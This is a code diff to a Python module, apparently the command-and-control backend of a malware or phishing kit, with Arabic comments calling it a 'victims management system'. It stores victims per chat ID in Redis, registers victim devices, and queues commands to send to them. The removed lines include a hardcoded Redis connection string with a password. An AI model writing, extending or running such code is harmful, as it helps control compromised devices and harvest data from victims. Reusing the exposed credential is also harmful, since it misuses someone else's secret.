@@ -1,6 +1,7 @@
 # victims_manager.py
 # ============================================================
-# نظام إدارة الضحايا — v4 (بدون تخزين بيانات كبيرة)
+# نظام إدارة الضحايا — v5
+# يقرأ Redis من config.py فقط
 # ============================================================
 
 import os
@@ -10,26 +11,17 @@ import uuid
 import secrets
 import redis
 
-REDIS_URL = os.getenv("REDIS_URL", "").strip()
-if not REDIS_URL:
-    REDIS_URL = "redis://default:aF4GQMQw6l9ZEpZjfThV2koySkuFbk9c@insect-outsize-shirt-48022.db.redis.io:15744"
-if REDIS_URL.startswith("redis-cli"):
-    REDIS_URL = REDIS_URL.split(" -u ")[-1].strip()
-if not REDIS_URL.startswith(("redis://", "rediss://", "unix://")):
-    REDIS_URL = "redis://" + REDIS_URL
-
 try:
-    redis_client = redis.Redis.from_url(REDIS_URL, decode_responses=True, socket_timeout=10)
-    redis_client.ping()
-    print("[+] Victims Manager: Redis connected")
+    from config import redis_client, REDIS_URL
+    print("[+] Victims Manager: Using shared Redis from config")
 except Exception as e:
-    print(f"[-] Victims Manager Redis: {e}")
+    print(f"[-] Victims Manager: config failed - {e}")
     redis_client = None
 
+if not redis_client:
+    print("[-] Victims Manager: ❌ Redis NOT available!")
 
-# ============================================================
-# Helpers
-# ============================================================
+
 def _victims_set(chat_id):
     return f"victims:{chat_id}"
 
@@ -43,9 +35,6 @@ def _cmd_queue(victim_id):
     return f"victim_cmd:{victim_id}"
 
 
-# ============================================================
-# إنشاء ضحية
-# ============================================================
 def create_victim(chat_id, name, site="general"):
     if not redis_client:
         return None
@@ -164,9 +153,6 @@ def register_victim_device(chat_id, victim_id, device_id, info=None):
         return False
 
 
-# ============================================================
-# ★★★ أوامر الضحية ★★★
-# ============================================================
 def queue_victim_command(victim_id, action, **kwargs):
     if not redis_client:
         return False
@@ -203,22 +189,15 @@ def pop_victim_commands(victim_id, max_count=10):
         return []
 
 
-# ============================================================
-# ★★★ البيانات — لا نخزن ★★★
-# ============================================================
 def add_victim_data(victim_id, data):
-    """لا نخزن — الإرسال مباشر في api_victim.py"""
+    """لا نخزن"""
     return True
 
 
 def get_victim_data(victim_id, limit=50):
-    """لا يوجد بيانات مخزنة"""
     return []
 
 
-# ============================================================
-# تحديث / إعادة تسمية / حذف
-# ============================================================
 def update_victim_status(chat_id, victim_id, status):
     if not redis_client:
         return False
